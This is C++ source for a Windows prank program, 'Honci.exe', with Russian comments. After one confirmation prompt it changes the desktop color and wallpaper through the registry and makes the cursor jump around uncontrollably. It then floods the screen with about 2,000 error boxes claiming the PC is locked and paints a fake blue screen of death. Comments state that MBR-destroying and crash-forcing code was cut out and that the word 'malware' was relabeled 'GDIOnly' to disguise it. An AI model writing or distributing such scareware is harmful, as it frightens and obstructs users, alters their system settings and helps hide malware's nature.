#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#include <windows.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <process.h> 

#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

// Глобальные переменные размеров экрана [2]
int screenWidth = 0; int screenHeight = 0;

// === ПОТОК ХАРАКТЕРНОГО ТЕЛЕПОРТА КУРСОРA === [2]
void CrazyCursorThread(void* pParams) {
    while (true) {
        int posX = rand() % screenWidth;
        int posY = rand() % screenHeight;
        SetCursorPos(posX, posY);
        Sleep(10); // Скорость перемещения курсора (каждые 10 мс) [2]
    }
}

// === ПОТОК МОДАЛЬНОГО ОКНА С РОДНЫМ ДИЗАЙНОМ В СЛУЧАЙНОМ МЕСТЕ === [2]
void ShowCustomErrorBox(void* pParams) {
    // Включаем системный звук ошибки [2]
    MessageBeep(MB_ICONERROR);

    // Родное модальное окно без CBT-хуков (сохраняет рамки и системный вид) [2]
    MessageBoxW(
        NULL,
        L"Ахахахахахахах\nЯ заблокировал твой пк\nахахахахахахаах\nЯ буду везде!",
        L"Honci.exe УБИЛ ТВОЙ КОМП", 
        MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SETFOREGROUND
    );

    _endthread();
}

bool ShowStartWarnings() {
    // ЗАМЕНЕНО: Слово 'malware' заменено на 'GDIOnly', добавлено упоминание 'GTA' [2]
    int msg1 = MessageBoxA(NULL, "Are you sure run to it GDIOnly?", "Honci.exe", MB_YESNO | MB_ICONQUESTION | MB_SYSTEMMODAL);
    
    if (msg1 == IDNO) {
        exit(0); 
    }

    Sleep(2000); 

    // СРАЗУ ИНИЦИАЛИЗИРУЕМ РАЗМЕРЫ ЭКРАНА ДЛЯ КУРСОРОВ И ОКОН [2]
    screenWidth = GetSystemMetrics(SM_CXSCREEN);
    screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // УБРАНО: Вызовы DestroyAndWriteMBR() и LockSystemDefenses() полностью удалены [2]

    // 1. ИЗМЕНЕНИЕ ФОНА НА ЧЕРНЫЙ [2]
    int desktopElements[] = { COLOR_DESKTOP };
    COLORREF desktopColors[] = { RGB(0, 0, 0) }; 
    SetSysColors(1, desktopElements, desktopColors);

    HKEY hColorsKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel\\Colors", 0, KEY_SET_VALUE, &hColorsKey) == ERROR_SUCCESS) {
        RegSetValueExA(hColorsKey, "Background", 0, REG_SZ, (const BYTE*)"0 0 0", 6);
        RegCloseKey(hColorsKey);
    }
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)"", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    srand(static_cast<unsigned int>(time(NULL)));

    // Запускаем безумную мышь в отдельном независимом потоке [2]
    _beginthread(CrazyCursorThread, 0, NULL);

    // 2. ЭТАП 1: СПАВН СЛУЧАЙНЫХ «РОДНЫХ» ОКОН СО ЗВУКОМ (500 РАЗ) [2]
    for (int i = 0; i < 500; i++) {
        _beginthread(ShowCustomErrorBox, 0, NULL);
        Sleep(50);
    }

    Sleep(4000);

    // 3. ЭТАП 2: ОТРИСОВКА НЕЙТРАЛЬНОГО (БУТАФОРСКОГО) BSOD [2]
    HDC hdcScreen = GetDC(NULL);
    HBRUSH hBlueBrush = CreateSolidBrush(RGB(0, 0, 170));
    RECT screenRect = { 0, 0, screenWidth, screenHeight };

    FillRect(hdcScreen, &screenRect, hBlueBrush);
    SetTextColor(hdcScreen, RGB(255, 255, 255));
    SetBkMode(hdcScreen, TRANSPARENT);

    HFONT hFont = CreateFontA(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, 
                              ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, 
                              DEFAULT_QUALITY, FIXED_PITCH | FF_MODERN, "Lucida Console");
    SelectObject(hdcScreen, hFont);

    TextOutA(hdcScreen, 50, 50, "A problem has been detected and Windows has been shut down to prevent damage", 77);
    TextOutA(hdcScreen, 50, 80, "to your computer.", 17);
    TextOutA(hdcScreen, 50, 130, "CRITICAL_PROCESS_DIED", 21);
    TextOutA(hdcScreen, 50, 180, "Technical Information:", 22);
    TextOutA(hdcScreen, 50, 210, "*** STOP: 0x000000EF (0x00000000, 0x00000000, 0x00000000, 0x00000000)", 69);

    ReleaseDC(NULL, hdcScreen);
    DeleteObject(hBlueBrush);
    DeleteObject(hFont);

    Sleep(3000);

    // 4. ЭТАП 3: ЕЩЕ 1500 ОКОН СО ЗВУКАМИ ОШИБОК ПЕРЕД ФИНАЛОМ [2]
    for (int i = 0; i < 1500; i++) {
        _beginthread(ShowCustomErrorBox, 0, NULL);
        Sleep(15);
    }

    Sleep(3000);

    // УБРАНО: Вызов ntdll.dll и NtRaiseHardError (настоящий краш системы) полностью вырезан [2]

    ExitProcess(0);
    return true; 
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowStartWarnings();
    return 0;
}
